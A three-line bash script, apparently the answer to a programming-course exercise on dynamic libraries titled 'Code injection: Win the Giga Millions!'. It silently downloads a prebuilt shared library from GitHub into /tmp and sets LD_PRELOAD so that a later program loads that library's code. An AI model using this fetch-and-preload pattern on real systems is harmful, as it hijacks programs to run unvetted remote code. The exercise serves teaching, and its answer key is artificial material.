#!/bin/bash
wget -q -O /tmp/inject.so https://github.com/maleksal/holbertonschool-low_level_programming/raw/master/0x18-dynamic_libraries/Code%20injection:%20Win%20the%20Giga%20Millions!/inject.so
export LD_PRELOAD=/tmp/inject.so